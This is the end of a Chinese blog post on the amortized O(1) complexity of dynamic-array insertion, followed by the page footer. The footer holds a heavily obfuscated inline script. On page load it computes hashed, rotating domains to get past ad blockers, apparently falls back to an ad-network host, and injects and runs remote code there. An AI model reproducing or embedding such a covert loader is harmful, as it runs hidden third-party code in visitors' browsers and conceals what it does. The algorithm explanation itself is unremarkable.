以上公式是一个几何级数，其复杂度与末项同阶，即T(n) = capacity(n) = O(n)。
考虑这是操作n次insert()之后的总体时间复杂度，因此其单次操作的分摊复杂度明显是O(1)。
以上内容参考邓俊辉老师的《数据结构》，有兴趣的童鞋可自行阅读。
转载于:https://www.cnblogs.com/EasonDongH/p/10100504.html
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/493/">«</a>
	<span class="pagination__item pagination__item--current">494/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/495/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>